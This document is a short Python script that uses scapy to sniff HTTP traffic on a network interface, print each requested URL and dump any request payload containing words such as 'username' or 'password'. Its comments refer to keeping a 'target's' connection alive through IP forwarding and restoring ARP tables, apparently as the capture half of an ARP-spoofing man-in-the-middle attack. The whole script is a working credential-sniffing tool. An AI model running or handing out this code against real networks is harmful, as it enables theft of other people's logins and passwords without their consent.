#!/usr/bin/env python

import subprocess
import sys
import scapy.all as scapy
from scapy.layers import http

# Function to sniff packets on the specified network interface.
# The sniffed packets are processed by the process_sniffed_packet function.
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to extract the URL from an HTTP request packet.
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function to extract possible login information (e.g., username and password) from a packet.
# The function checks the packet's Raw layer for specific keywords related to login credentials.
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = str(load)  # Convert the load to a string to avoid type errors.
        
        # List of common keywords used in login forms.
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

# Function to process each sniffed packet.
# If the packet contains an HTTP request, it extracts the URL and checks for login information.
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >>> " + login_info + "\n\n")

# Function to exit the program gracefully
def cleanup():
    print("\n[-] Exiting gracefully.")
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)  # Disable IP forwarding
    sys.exit(0)  # Exit the program

# Start sniffing on the specified network interface.
# Ensure packet forwarding is enabled to maintain the target's internet connection.
try: 
    if __name__ == "__main__":
        interface = input("[+] Enter the network interface to sniff (e.g., eth0, wlan0): ")
        print("[+] Sniffing started on " + interface )
        sniff(interface)
except KeyboardInterrupt:
    # Handle keyboard interrupt and restore ARP tables
    print("\n\n[-] Detected Ctrl + C ....")
    cleanup()  # Handle graceful exit on keyboard interrupt
